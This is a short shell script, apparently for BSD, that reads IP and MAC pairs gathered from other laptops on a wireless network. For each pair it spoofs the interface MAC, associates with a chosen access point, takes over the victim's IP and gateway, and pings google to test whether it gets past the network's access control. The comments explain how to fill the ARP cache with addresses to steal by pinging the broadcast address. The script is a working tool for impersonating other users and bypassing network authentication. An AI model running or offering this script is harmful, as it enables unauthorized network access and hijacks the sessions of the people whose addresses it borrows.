#!/bin/sh
# Given an input of IP and MAC pairs, use them and try to ping google.
# If the google ping succeeds, then this pair is good to use to get off the network.

sudo () { 
  echo "$@"; /usr/local/bin/sudo "$@" 
};

# the 'ipmac' file consists of line delimited ip and mac pairs.
# IP MAC
# such as 
# 10.224.12.77 00:de:ad:be:ef:09
#
# I generated mine by pinging the broadcast address which had 33 happy laptops
# responding, which fills up my arp cache with valid entries quickly and easily.

cat ipmac \
| while read a; do 
  set -- $a;
  echo $a;
  sudo assoc > /dev/null 2>&1;
  sudo ifconfig ath0 down;
  sudo ifconfig ath0 up;
  sudo ifconfig ath0 ether $2;
  sudo ifconfig ath0 down;
  sudo ifconfig ath0 up;

  # Set your ssid, bssid, and channel now.
  sudo ifconfig ath0 ssid foo bssid 00:11:22:33:44:55 channel 1

  try=1;
  while [ $try -lt 5 ]; do 
    echo "Waiting for associate";
    ifconfig ath0 | grep 'status: associated' && try=100;
    try=$(($try + 1));
    sleep 3;
  done;

  sudo route delete default
  sudo ifconfig ath0 inet $1 netmask 0xfffff800;
  sudo route add default 10.224.8.1;
  echo 'pinging google?';
  host google.com;
  ping -t 5 google.com
done
